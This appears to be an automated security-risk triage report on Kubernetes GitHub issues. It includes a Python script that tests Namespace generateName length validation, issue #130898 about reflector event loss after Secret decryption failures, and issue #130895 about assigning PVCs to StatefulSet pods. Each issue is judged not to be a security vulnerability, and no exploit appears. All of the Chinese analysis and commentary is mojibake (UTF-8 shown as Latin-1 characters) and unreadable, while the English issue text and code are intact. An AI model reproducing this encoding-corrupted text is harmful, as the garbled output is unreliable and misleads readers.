                # æ£€æŸ¥é”™è¯¯ä¿¡æ¯æ˜¯å¦ä¸ Issue ä¸­æè¿°çš„ä¸€è‡´
                if "metadata.generateName" in e.body and "must be no more than 63 characters" in e.body:
                    print("\néªŒè¯æˆåŠŸï¼šé”™è¯¯ä¿¡æ¯ä¸ Issue ä¸­æè¿°çš„éªŒè¯å¤±è´¥ä¸€è‡´ã€‚")
                else:
                    print("\nè­¦å‘Šï¼šé”™è¯¯ä¿¡æ¯ä¸é¢„æœŸä¸å®Œå…¨ä¸€è‡´ï¼Œè¯·æ£€æŸ¥è¯¦æƒ…ã€‚")
            except json.JSONDecodeError:
                print(f"é”™è¯¯è¯¦æƒ… (åŸå§‹æ–‡æœ¬): {e.body}")
            except Exception as parse_e:
                print(f"è§£æé”™è¯¯è¯¦æƒ…æ—¶å‡ºé”™: {parse_e}", file=sys.stderr)
                print(f"é”™è¯¯è¯¦æƒ… (åŸå§‹æ–‡æœ¬): {e.body}")
        else:
            print("API æœªè¿”å›é”™è¯¯è¯¦æƒ…ä½“ã€‚")

    except Exception as e:
        elapsed_time = time.time() - start_time
        print(f"\nå‘ç”Ÿé API å¼‚å¸¸é”™è¯¯ (è€—æ—¶ {elapsed_time:.2f} ç§’): {e}", file=sys.stderr)
        sys.exit(1)

# ç›´æ¥æ‰§è¡Œ main å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1.  **ç›®çš„**: è¯¥ Python è„šæœ¬æ—¨åœ¨ä½¿ç”¨ Kubernetes Python å®¢æˆ·ç«¯åº“å¤ç° Issue ä¸­æè¿°çš„é—®é¢˜ï¼Œå³å°è¯•åˆ›å»ºä¸€ä¸ª `metadata.generateName` å­—æ®µå€¼è¶…è¿‡ 63 ä¸ªå­—ç¬¦çš„ Namespaceï¼Œå¹¶éªŒè¯è¯¥æ“ä½œæ˜¯å¦ä¼šå¦‚é¢„æœŸèˆ¬å¤±è´¥ã€‚
2.  **åº“**: è„šæœ¬ä½¿ç”¨äº† `kubernetes` Python åº“ä¸ Kubernetes é›†ç¾¤è¿›è¡Œäº¤äº’ã€‚
3.  **è®¤è¯**: è„šæœ¬é€šè¿‡ `kubernetes.config.load_kube_config()` ä»é»˜è®¤ä½ç½®ï¼ˆé€šå¸¸æ˜¯ `~/.kube/config`ï¼‰åŠ è½½ Kubernetes é…ç½®ï¼Œä»¥è·å–ä¸é›†ç¾¤é€šä¿¡æ‰€éœ€çš„è®¤è¯ä¿¡æ¯ã€‚
4.  **æ“ä½œ**:
    *   å®šä¹‰äº†ä¸€ä¸ªé•¿åº¦è¶…è¿‡ 63 ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸² `long_generate_name`ã€‚
    *   åˆ›å»ºäº†ä¸€ä¸ª `kubernetes.client.V1Namespace` å¯¹è±¡ï¼Œå…¶ `metadata.generate_name` è®¾ç½®ä¸ºè¿™ä¸ªé•¿å­—ç¬¦ä¸²ã€‚
    *   è°ƒç”¨ `CoreV1Api` çš„ `create_namespace` æ–¹æ³•å°è¯•åœ¨é›†ç¾¤ä¸­åˆ›å»ºè¿™ä¸ª Namespaceã€‚
    *   è®¾ç½®äº† `_request_timeout` å‚æ•°ä»¥ç¡®ä¿è„šæœ¬ä¸ä¼šæ— é™æœŸç­‰å¾…ï¼Œç¬¦åˆè¶…æ—¶è¦æ±‚ã€‚
5.  **é¢„æœŸç»“æœä¸éªŒè¯**:
    *   è„šæœ¬é¢„æœŸ `create_namespace` è°ƒç”¨ä¼šå¤±è´¥ï¼Œå¹¶æŠ›å‡º `kubernetes.client.exceptions.ApiException`ã€‚
    *   åœ¨ `except ApiException` å—ä¸­ï¼Œè„šæœ¬ä¼šæ‰“å°å‡ºå¤±è´¥ä¿¡æ¯ï¼ŒåŒ…æ‹¬ HTTP çŠ¶æ€ç ã€åŸå› å’Œ API Server è¿”å›çš„é”™è¯¯è¯¦æƒ…ï¼ˆbodyï¼‰ã€‚
    *   è„šæœ¬ä¼šç‰¹åˆ«æ£€æŸ¥è¿”å›çš„é”™è¯¯è¯¦æƒ…ä¸­æ˜¯å¦åŒ…å«ç±»ä¼¼ "metadata.generateName ... must be no more than 63 characters" çš„å…³é”®ä¿¡æ¯ï¼Œä»¥ç¡®è®¤å¤±è´¥åŸå› ä¸ Issue ä¸­æè¿°çš„ä¸€è‡´ã€‚
    *   å¦‚æœ Namespace æ„å¤–åˆ›å»ºæˆåŠŸï¼ˆè¿™ä¸ç¬¦åˆ Issue æè¿°å’Œé¢„æœŸï¼‰ï¼Œè„šæœ¬ä¼šæ‰“å°æˆåŠŸä¿¡æ¯å¹¶å°è¯•åˆ é™¤è¯¥ Namespaceã€‚
6.  **æ‰§è¡Œ**: è„šæœ¬å¯ä»¥ç›´æ¥é€šè¿‡ Python è§£é‡Šå™¨æ‰§è¡Œã€‚å®ƒæ²¡æœ‰å®šä¹‰ `if __name__ == "__main__":` å—ï¼Œè€Œæ˜¯ç›´æ¥è°ƒç”¨ `main()` å‡½æ•°ã€‚

è¯¥è„šæœ¬æ¨¡æ‹Ÿäº†ç”¨æˆ·å°è¯•è¿›è¡Œæ— æ•ˆæ“ä½œçš„åœºæ™¯ï¼Œå¹¶éªŒè¯äº† Kubernetes API Server çš„è¡Œä¸ºï¼ˆæ‹’ç»æ— æ•ˆè¾“å…¥ï¼‰ï¼Œä»è€Œå¤ç°äº† Issue ä¸­æŠ¥å‘Šçš„ç°è±¡ï¼Œä½†è¿™å¹¶ä¸ä»£è¡¨å­˜åœ¨å®‰å…¨é£é™©ã€‚

---


## Issue #130898 API server reflector may lose events if TransformFromStorage fails

- Issue é“¾æ¥ï¼š[#130898](https://github.com/kubernetes/kubernetes/issues/130898)

### Issue å†…å®¹

#### What happened?

Hi ğŸ‘‹ ,

I'm investigating an issue where create or update operations on `Secrets` are _randomly_ not reflected in the controller runtime client cache. We have observed this behaviour multiple times, in at least 3 different operators, all relying on the controller-runtime client, and one of them being the External Secrets Operator. As a result the controllers indefinitely attempt to reconcile the missed `Secrets` from their stale cache, perpetually getting `409` errors until they are manually restarted. These Secrets seem to be lost by the `Watch` mechanism, while they are successfully created (as confirmed by audit logs), and eventually available in a `List` result.

After some investigations I realized that when this problem occur we also have transient errors related to Secret decryption, for example:

```
watcher.go:471] failed to prepare current and previous objects: failed to decrypt DEK, error: rpc error: code = Canceled desc = grpc: the client connection is closing
reflector.go:467] storage/cacher.go:/secrets: retrying watch of *core.Secret internal error: Internal error occurred: failed to decrypt DEK, error: rpc error: code = Canceled desc = grpc: the client connection is closing
```

I have tried to understand how events are processed in `storage/etcd3/watcher.go`, more specifically here:

https://github.com/kubernetes/kubernetes/blob/6a074997c960757de911780f250ecd9931917366/staging/src/k8s.io/apiserver/pkg/storage/etcd3/watcher.go#L427-L437

IIUC when an error occurs, an "error event" is sent back to the reflector through a channel:

https://github.com/kubernetes/kubernetes/blob/6a074997c960757de911780f250ecd9931917366/staging/src/k8s.io/apiserver/pkg/storage/etcd3/watcher.go#L469-L474


But IIUC we keep processing other incoming events? This leads me to wonder if there is not a situation where:

1. etcd watcher temporary fails to decrypt a Secret with `resourceVersion=V`, the error is sent to the reflector:

https://github.com/kubernetes/kubernetes/blob/6a074997c960757de911780f250ecd9931917366/staging/src/k8s.io/client-go/tools/cache/reflector.go#L737-L743

2. Assuming that `case apierrors.IsInternalError(err) && retry.ShouldRetry()` is true the reflector is going to run the `watchHandler` again:

https://github.com/kubernetes/kubernetes/blob/6a074997c960757de911780f250ecd9931917366/staging/src/k8s.io/client-go/tools/cache/reflector.go#L466-L468

3. Meanwhile, let's suppose that the etcd watcher managed to decrypt another `Secret`, with a different name and with `resourceVersion=V+1`, the result is sent to the watcher which calls `setLastSyncResourceVersion` with `V+1` as a value here:

https://github.com/kubernetes/kubernetes/blob/6a074997c960757de911780f250ecd9931917366/staging/src/k8s.io/client-go/tools/cache/reflector.go#L791

Which feels wrong since `Secret` with `resourceVersion` `V` has not been observed yet?

I would like to know if this sounds like a possible scenario that may explain what we are observing. If not please let me know if you have any ideas that might explain it. Thanks!

We have observed this issue on K8s 1.30 (v1.30.10-eks-bc803b4) with the following libraries:
* k8s.io/api v0.32.2
* k8s.io/apimachinery v0.32.2
* k8s.io/client-go v0.32.2
* sigs.k8s.io/controller-runtime v0.20.2

#### What did you expect to happen?

I think I would expect the Secrets which suffered what could be a temporary decryption failure to be eventually reflected in the cache.

#### How can we reproduce it (as minimally and precisely as possible)?

Unfortunately, this happens randomly in our case ğŸ˜• That being said if I run the API Server in a dev environment and _temporarily_ return an error in the `TransformFromStorage` function for a specific `Secret`, I can observe that this `Secret` is never going to be sent to a client while other `Secrets` created at the same time are correctly reflected in the controller-runtime client.

#### Anything else we need to know?

This part of the code is (really) new to me but I'm happy to help, so please let me know if there is anything else I should investigate!

#### Kubernetes version

<details>

```console
$ kubectl version
Server Version: v1.30.10-eks-bc803b4
```

</details>


#### Cloud provider

<details>
* EKS (eks.23 / K8s 1.30) 
</details>


#### OS version

_No response_

#### Install tools




#### Container runtime (CRI) and version (if applicable)




#### Related plugins (CNI, CSI, ...) and versions (if applicable)




### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ª Kubernetes API Server ä¸­ Reflector ç»„ä»¶åœ¨å¤„ç† Watch äº‹ä»¶æ—¶å¯èƒ½å­˜åœ¨çš„é—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼Œå½“ `TransformFromStorage` å‡½æ•°ï¼ˆä¾‹å¦‚ï¼Œåœ¨è§£å¯† Secret æ—¶ï¼‰å¤±è´¥æ—¶ï¼ŒReflector å¯èƒ½ä¼šä¸¢å¤±è¯¥äº‹ä»¶ã€‚

é—®é¢˜æµç¨‹åˆ†æï¼š
1.  Etcd Watcher ç›‘å¬åˆ°ä¸€ä¸ªèµ„æºï¼ˆå¦‚ Secret Aï¼Œç‰ˆæœ¬ Vï¼‰çš„å˜æ›´ã€‚
2.  API Server å°è¯•é€šè¿‡ `TransformFromStorage` å¤„ç†è¯¥èµ„æºï¼Œä½†åœ¨è¿™ä¸€æ­¥å¤±è´¥ï¼ˆä¾‹å¦‚ï¼Œç”±äºä¸´æ—¶çš„ KMS æˆ–ç½‘ç»œé—®é¢˜å¯¼è‡´è§£å¯† DEK å¤±è´¥ï¼‰ã€‚
3.  Watcher å°†ä¸€ä¸ªé”™è¯¯äº‹ä»¶å‘é€ç»™ Reflectorã€‚
4.  Reflector æ”¶åˆ°é”™è¯¯äº‹ä»¶ã€‚æ ¹æ®ä»£ç é€»è¾‘ (`apierrors.IsInternalError(err) && retry.ShouldRetry()`)ï¼ŒReflector å‡†å¤‡é‡è¯• Watch æ“ä½œã€‚
5.  åœ¨ Reflector æˆåŠŸé‡è¯•å¹¶å¤„ç† Secret A (ç‰ˆæœ¬ V) *ä¹‹å‰*ï¼ŒEtcd Watcher å¯èƒ½æˆåŠŸå¤„ç†äº† *å¦ä¸€ä¸ª* èµ„æºï¼ˆå¦‚ Secret Bï¼Œç‰ˆæœ¬ V+1ï¼‰çš„äº‹ä»¶ã€‚
6.  Watcher å°† Secret B (ç‰ˆæœ¬ V+1) çš„äº‹ä»¶å‘é€ç»™ Reflectorã€‚
7.  Reflector æˆåŠŸå¤„ç†äº† Secret B (ç‰ˆæœ¬ V+1) çš„äº‹ä»¶ï¼Œå¹¶è°ƒç”¨ `setLastSyncResourceVersion` å°†å…¶å†…éƒ¨è®°å½•çš„æœ€æ–°åŒæ­¥èµ„æºç‰ˆæœ¬æ›´æ–°ä¸º V+1ã€‚
8.  å½“ Reflector ç¨åé‡è¯• Watch æ“ä½œæ—¶ï¼ˆå¯èƒ½å› ä¸ºä¹‹å‰çš„é”™è¯¯ï¼‰ï¼Œå®ƒå¯èƒ½ä¼šä» V+1 ç‰ˆæœ¬å¼€å§‹ Watchï¼Œä»è€Œæ°¸ä¹…æ€§åœ°é”™è¿‡äº†ç‰ˆæœ¬ V çš„ Secret A äº‹ä»¶ã€‚

åæœï¼š
ä¾èµ–äº Watch æœºåˆ¶çš„ Controller (å¦‚ `controller-runtime` çš„ client cache) å°†æ— æ³•æ¥æ”¶åˆ° Secret A çš„æ›´æ–°æˆ–åˆ›å»ºäº‹ä»¶ï¼Œå¯¼è‡´å…¶ç¼“å­˜çŠ¶æ€ä¸å®é™…é›†ç¾¤çŠ¶æ€ä¸ä¸€è‡´ã€‚è¿™ä¼šå¼•å‘ Controller çš„é”™è¯¯è¡Œä¸ºï¼Œä¾‹å¦‚ä¸æ–­å°è¯•åŸºäºè¿‡æ—¶ä¿¡æ¯è¿›è¡Œåè°ƒï¼Œå¹¶å¯èƒ½æ”¶åˆ° `409 Conflict` é”™è¯¯ï¼Œç›´åˆ° Controller é‡å¯ä»¥å¼ºåˆ¶è¿›è¡Œ List æ“ä½œåŒæ­¥å®Œæ•´çŠ¶æ€ã€‚

å®‰å…¨é£é™©è¯„ä¼°ï¼š
*   **é—®é¢˜æ€§è´¨ï¼š** è¿™æ˜¯ä¸€ä¸ªæ•°æ®ä¸€è‡´æ€§å’Œå¯é æ€§é—®é¢˜ã€‚æ§åˆ¶å™¨çš„ç¼“å­˜å¯èƒ½ä¸å®é™…çŠ¶æ€ä¸ç¬¦ã€‚
*   **è§¦å‘æ¡ä»¶ï¼š** è¯¥é—®é¢˜ç”±å†…éƒ¨é”™è¯¯ï¼ˆå¦‚ Secret è§£å¯†å¤±è´¥ï¼‰è§¦å‘ï¼Œè€Œä¸æ˜¯ç”±å¤–éƒ¨æ”»å‡»è€…ç›´æ¥æ§åˆ¶ã€‚è§£å¯†å¤±è´¥é€šå¸¸ä¸ KMS æœåŠ¡å¯ç”¨æ€§ã€ç½‘ç»œåˆ†åŒºæˆ– API Server ä¸ KMS ä¹‹é—´çš„è¿æ¥é—®é¢˜æœ‰å…³ã€‚
*   **å½±å“èŒƒå›´ï¼š** ä¸»è¦å½±å“ä¾èµ– Watch æœºåˆ¶è·å–æœ€æ–°èµ„æºçŠ¶æ€çš„ Controller çš„æ­£ç¡®æ€§ã€‚å¦‚æœ Controller è´Ÿè´£ç®¡ç†æ•æ„Ÿé…ç½®æˆ–å‡­æ®ï¼ˆå­˜å‚¨åœ¨ Secret ä¸­ï¼‰ï¼Œé‚£ä¹ˆæœªèƒ½åŠæ—¶è·å–æ›´æ–°å¯èƒ½é—´æ¥å¯¼è‡´å®‰å…¨é—®é¢˜ï¼ˆä¾‹å¦‚ï¼Œæ—§å‡­æ®æœªæŒ‰é¢„æœŸè½®æ¢ï¼‰ã€‚
*   **å¯åˆ©ç”¨æ€§ï¼š** æ”»å‡»è€…æ— æ³•ç›´æ¥åˆ©ç”¨æ­¤é—®é¢˜æ¥æ‰§è¡Œæ¶æ„æ“ä½œï¼Œå¦‚ææƒã€å‘½ä»¤æ‰§è¡Œæˆ–ä¿¡æ¯æ³„éœ²ï¼ˆé™¤äº†æ§åˆ¶å™¨æœ¬åº”çœ‹åˆ°çš„ä¿¡æ¯ä¹‹å¤–ï¼‰ã€‚æ”»å‡»è€…éœ€è¦å…ˆå¼•èµ· `TransformFromStorage` å¤±è´¥ï¼Œè¿™é€šå¸¸éœ€è¦å¯¹åº•å±‚åŸºç¡€è®¾æ–½ï¼ˆå¦‚ KMSï¼‰æœ‰ä¸€å®šç¨‹åº¦çš„æ§åˆ¶æˆ–é‡åˆ°ç‰¹å®šçš„ç³»ç»Ÿæ•…éšœã€‚
*   **æ‹’ç»æœåŠ¡ (DoS)ï¼š** è¿™å¯èƒ½å¯¼è‡´ä¾èµ–å—å½±å“ Controller çš„æœåŠ¡åŠŸèƒ½éƒ¨åˆ†æˆ–å®Œå…¨ä¸å¯ç”¨ï¼Œä½†è¿™ä¸æ˜¯å…¸å‹çš„ç”±æ”»å‡»è€…å‘èµ·çš„ DoS æ”»å‡»ã€‚æ ¹æ®æ ‡å‡† 5ï¼Œå³ä½¿å¯ä»¥çœ‹ä½œæŸç§å½¢å¼çš„ DoSï¼ˆåŠŸèƒ½å¤±æ•ˆï¼‰ï¼Œå…¶è§¦å‘å¹¶éç”±ä½æƒé™ç”¨æˆ·å‘èµ·ï¼Œè€Œæ˜¯ç³»ç»Ÿå†…éƒ¨é”™è¯¯ã€‚
*   **æ•æ„Ÿä¿¡æ¯æš´éœ² (Criterion 4)ï¼š** Issue æäº¤è€…æœªæš´éœ²æ•æ„Ÿä¿¡æ¯ã€‚
*   **é«˜é£é™©åœºæ™¯ (Criterion 7, 8)ï¼š** ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒæˆ–è·¨ç§Ÿæˆ·å½±å“ã€‚

ç»“è®ºï¼šè¯¥é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç”±å†…éƒ¨é”™è¯¯è§¦å‘çš„ç³»ç»Ÿå¯é æ€§ç¼ºé™·ï¼Œå¯¼è‡´æ•°æ®ä¸ä¸€è‡´ã€‚è™½ç„¶å…¶åæœå¯èƒ½å½±å“ä¾èµ–è¿™äº›æ•°æ®çš„ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼ˆä¾‹å¦‚ï¼Œå»¶è¿Ÿäº†å‡­è¯è½®æ¢ï¼‰ï¼Œä½†å®ƒæœ¬èº«ä¸æ˜¯ä¸€ä¸ªå¯è¢«æ”»å‡»è€…ç›´æ¥åˆ©ç”¨æ¥ç ´åç³»ç»Ÿå®‰å…¨è¾¹ç•Œï¼ˆå¦‚ææƒã€è·å–æœªæˆæƒæ•°æ®ï¼‰çš„æ¼æ´ã€‚æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œç‰¹åˆ«æ˜¯ç¬¬ 2ã€3ã€5 æ¡ï¼Œè¯¥é—®é¢˜ä¸æ„æˆä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# N/A
# è¯¥ Issue è¢«è¯„ä¼°ä¸º "ä¸æ¶‰åŠ" å®‰å…¨é£é™©ï¼Œä¸»è¦æ˜¯ä¸€ä¸ªå¯é æ€§/æ•°æ®ä¸€è‡´æ€§é—®é¢˜ã€‚
# æ ¹æ®è¦æ±‚ï¼Œä»…å¯¹é«˜é£é™©é—®é¢˜æä¾› POCã€‚
# æ­¤é—®é¢˜éš¾ä»¥é€šè¿‡ç®€å•çš„å¤–éƒ¨è„šæœ¬ç¨³å®šå¤ç°ï¼Œå› ä¸ºå®ƒä¾èµ–äºæ¨¡æ‹Ÿ API Server å†…éƒ¨å¤„ç† Watch äº‹ä»¶æ—¶å‘ç”Ÿçš„ç‰¹å®šé”™è¯¯ï¼ˆå¦‚ TransformFromStorage å¤±è´¥ï¼‰ä»¥åŠç²¾ç¡®çš„æ—¶åºã€‚
# ç”¨æˆ·åœ¨ Issue ä¸­æè¿°äº†é€šè¿‡ä¿®æ”¹ API Server å†…éƒ¨ä»£ç æ¥æ¨¡æ‹Ÿæ­¤åœºæ™¯çš„æ–¹æ³•ï¼Œè¿™ä¸é€‚åˆä½œä¸ºå¤–éƒ¨ POCã€‚
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Issue æè¿°çš„æ˜¯ Kubernetes API Server åœ¨å¤„ç† Watch äº‹ä»¶æ—¶ï¼Œç”±äºå†…éƒ¨é”™è¯¯ï¼ˆå¦‚ Secret è§£å¯†å¤±è´¥ï¼‰å’Œç‰¹å®šçš„äº‹ä»¶å¤„ç†é¡ºåºï¼Œå¯èƒ½å¯¼è‡´ Reflector ä¸¢å¤±äº‹ä»¶ï¼Œè¿›è€Œä½¿å¾— Controller çš„ç¼“å­˜ä¸å®é™…çŠ¶æ€ä¸ä¸€è‡´ã€‚è¿™æ˜¯ä¸€ä¸ªç³»ç»Ÿå¯é æ€§é—®é¢˜ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…æ— æ³•ç›´æ¥åˆ©ç”¨æ­¤æœºåˆ¶è¿›è¡Œææƒã€ä¿¡æ¯æ³„éœ²æˆ–æ‰§è¡Œå‘½ä»¤ã€‚ç”±äºè¯¥é—®é¢˜ä¸æ»¡è¶³é«˜é£é™©æ¼æ´çš„å®šä¹‰ï¼ˆå¦‚å‘½ä»¤æ‰§è¡Œã€ææƒç­‰ï¼‰ï¼Œä¸”è§¦å‘æ¡ä»¶ä¸ºå†…éƒ¨é”™è¯¯è€Œéæ”»å‡»è€…è¡Œä¸ºï¼Œå› æ­¤é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚æ ¹æ®è¦æ±‚ï¼Œæˆ‘ä»¬ä¸ä¸ºéé«˜é£é™©æˆ–ä¸æ¶‰åŠå®‰å…¨é£é™©çš„ Issue æä¾›å¤ç° POCã€‚

---


## Issue #130895 How to each pod in the StatefulSet should be manually assigned a specific PVC?

- Issue é“¾æ¥ï¼š[#130895](https://github.com/kubernetes/kubernetes/issues/130895)

### Issue å†…å®¹

#### What happened?

So i try to set each pod in the StatefulSet should be manually assigned a specific PVC without use volumeClaimTemplates.

I use the petch for each pods and statefulset also but there are not working.

So this is my pvc.yaml file code :

`apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: busybox-pvc-0
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 1Gi
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: busybox-pvc-1
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 1Gi
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: busybox-pvc-2
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 1Gi
`

and this is my statefullset.yaml code :

`apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: busybox
spec:
  serviceName: "busybox-service"
  replicas: 3
  selector:
    matchLabels:
      app: busybox
  template:
    metadata:
      labels:
        app: busybox
    spec:
      containers:
      - name: busybox
        image: busybox
        command: ["/bin/sh", "-c", "sleep 3600"]
        volumeMounts:
        - name: busybox-storage
          mountPath: /mnt/data
      volumes:
      - name: busybox-storage
        persistentVolumeClaim:
          claimName: busybox-pvc-0`

and i try to use "petch" like this but there are get error like this:

`dev_2@Tadhak-dev-02:~/Backup/Opensearch/Stateful_PVC$ minikube kubectl -- patch pod busybox-0 --type='json' -p '[{"op": "replace", "path": "/
spec/volumes/0/persistentVolumeClaim/claimName", "value": "busybox-pvc-0"}]'
The request is invalid: the server rejected our request due to an error in our request
dev_2@Tadhak-dev-02:~/Backup/Opensearch/Stateful_PVC$ minikube kubectl -- patch pod busybox-1 --type='json' -p '[{"op": "replace", "path": "/spec/volumes/0/persistentVolumeClaim/claimName", "value": "busybox-pvc-1"}]'
The Pod "busybox-1" is invalid: spec: Forbidden: pod updates may not change fields other than `spec.containers[*].image`,`spec.initContainers[*].image`,`spec.activeDeadlineSeconds`,`spec.tolerations` (only additions to existing tolerations),`spec.terminationGracePeriodSeconds` (allow it to be set to 1 if it was previously negative)
  core.PodSpec{
  	Volumes: []core.Volume{
  		{
  			Name: "busybox-storage",
  			VolumeSource: core.VolumeSource{
  				... // 7 identical fields
  				ISCSI:     nil,
  				Glusterfs: nil,
  				PersistentVolumeClaim: &core.PersistentVolumeClaimVolumeSource{
- 					ClaimName: "busybox-pvc-0",
+ 					ClaimName: "busybox-pvc-1",
  					ReadOnly:  false,
  				},
  				RBD:     nil,
  				Quobyte: nil,
  				... // 18 identical fields
  			},
  		},
  		{Name: "kube-api-access-jzfbk", VolumeSource: {Projected: &{Sources: {{ServiceAccountToken: &{ExpirationSeconds: 3607, Path: "token"}}, {ConfigMap: &{LocalObjectReference: {Name: "kube-root-ca.crt"}, Items: {{Key: "ca.crt", Path: "ca.crt"}}}}, {DownwardAPI: &{Items: {{Path: "namespace", FieldRef: &{APIVersion: "v1", FieldPath: "metadata.namespace"}}}}}}, DefaultMode: &420}}},
  	},
  	InitContainers: nil,
  	Containers:     {{Name: "busybox", Image: "busybox", Command: {"/bin/sh", "-c", "sleep 3600"}, VolumeMounts: {{Name: "busybox-storage", MountPath: "/mnt/data"}, {Name: "kube-api-access-jzfbk", ReadOnly: true, MountPath: "/var/run/secrets/kubernetes.io/serviceaccount"}}, ...}},
  	... // 30 identical fields
  }
`



#### What did you expect to happen?

So how to do this working for set each pod in the StatefulSet should be manually assigned a specific PVC without use volumeClaimTemplates.

busybox-0 â†’ busybox-pvc-0
busybox-1 â†’ busybox-pvc-1
busybox-2 â†’ busybox-pvc-2



```console
$ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.0

```


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ªç”¨æˆ·åœ¨ä½¿ç”¨ Kubernetes StatefulSet æ—¶é‡åˆ°çš„é…ç½®é—®é¢˜ã€‚ç”¨æˆ·å¸Œæœ›ä¸º StatefulSet ä¸­çš„æ¯ä¸ª Pod æ‰‹åŠ¨åˆ†é…ä¸€ä¸ªé¢„å…ˆåˆ›å»ºå¥½çš„ã€ç‰¹å®šçš„ PersistentVolumeClaim (PVC)ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ `volumeClaimTemplates` è‡ªåŠ¨åˆ›å»ºã€‚

ç”¨æˆ·çš„å°è¯•æ–¹æ³•æ˜¯ï¼š
1.  åˆ›å»ºäº†ä¸‰ä¸ªç‹¬ç«‹çš„ PVC (`busybox-pvc-0`, `busybox-pvc-1`, `busybox-pvc-2`)ã€‚
2.  åˆ›å»ºäº†ä¸€ä¸ª StatefulSetï¼Œå…¶ Pod æ¨¡æ¿ (`spec.template.spec.volumes`) ä¸­ç¡¬ç¼–ç å¼•ç”¨äº†ç¬¬ä¸€ä¸ª PVC (`busybox-pvc-0`)ã€‚
3.  å°è¯•åœ¨ Pod å¯åŠ¨åï¼Œä½¿ç”¨ `kubectl patch` å‘½ä»¤ä¿®æ”¹å„ä¸ª Pod (`busybox-0`, `busybox-1`, `busybox-2`) çš„ `spec.volumes[0].persistentVolumeClaim.claimName` å­—æ®µï¼Œä½¿å…¶æŒ‡å‘å¯¹åº”çš„ PVCã€‚

ç”¨æˆ·çš„ `patch` æ“ä½œå¤±è´¥äº†ï¼Œæ”¶åˆ°çš„é”™è¯¯ä¿¡æ¯æ˜ç¡®æŒ‡å‡º Pod çš„ `spec` ä¸­çš„æŸäº›å­—æ®µï¼ˆåŒ…æ‹¬ `volumes`ï¼‰åœ¨åˆ›å»ºåæ˜¯ä¸å¯å˜çš„ (`Forbidden: pod updates may not change fields other than...`)ã€‚

æ ¸å¿ƒé—®é¢˜åœ¨äºç”¨æˆ·è¯•å›¾ä¿®æ”¹ Pod çš„ä¸å¯å˜å­—æ®µï¼Œè¿™æ˜¯ Kubernetes è®¾è®¡ä¸Šçš„é™åˆ¶ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚ç”¨æˆ·é‡åˆ°çš„é—®é¢˜æ˜¯å¦‚ä½•æ­£ç¡®é…ç½® StatefulSet ä»¥å®ç°å…¶ç›®æ ‡ï¼ˆå³æ‰‹åŠ¨ã€é™æ€åœ°å°†ç‰¹å®š PVC ç»‘å®šåˆ°ç‰¹å®š Pod åºå·ï¼‰ï¼Œè¿™å±äº Kubernetes çš„ä½¿ç”¨æ–¹æ³•å’Œé…ç½®èŒƒç•´ã€‚è¯¥ Issue æ²¡æœ‰æŠ¥å‘Šä»»ä½•è½¯ä»¶ç¼ºé™·ï¼Œæ›´ä¸æ¶‰åŠå®‰å…¨æ¼æ´ï¼Œå¦‚å‘½ä»¤æ‰§è¡Œã€ææƒã€ä¿¡æ¯æ³„éœ²ç­‰ã€‚ç”¨æˆ·æä¾›çš„ YAML é…ç½®å’Œå°è¯•çš„å‘½ä»¤ä¹Ÿæœªæš´éœ²æ•æ„Ÿä¿¡æ¯æˆ–å¼•å…¥å®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥ Issue æ˜¯ä¸€ä¸ªå…³äº Kubernetes é…ç½®å’Œä½¿ç”¨çš„é—®é¢˜ï¼Œå¹¶éå®‰å…¨æ¼æ´æŠ¥å‘Šã€‚
# ç”¨æˆ·å°è¯•ä¿®æ”¹ Pod çš„ä¸å¯å˜å­—æ®µå¯¼è‡´æ“ä½œå¤±è´¥ï¼Œè¿™æ˜¯ Kubernetes çš„é¢„æœŸè¡Œä¸ºã€‚
# å› æ­¤ï¼Œä¸å­˜åœ¨éœ€è¦å¤ç°çš„å®‰å…¨é£é™©ï¼Œæ— éœ€æä¾› POC è„šæœ¬ã€‚

print("è¯¥ Issue æè¿°çš„æ˜¯ Kubernetes é…ç½®é—®é¢˜ï¼Œéå®‰å…¨æ¼æ´ï¼Œæ— éœ€ POCã€‚")
```


**è§£é‡Šè¯´æ˜ï¼š**

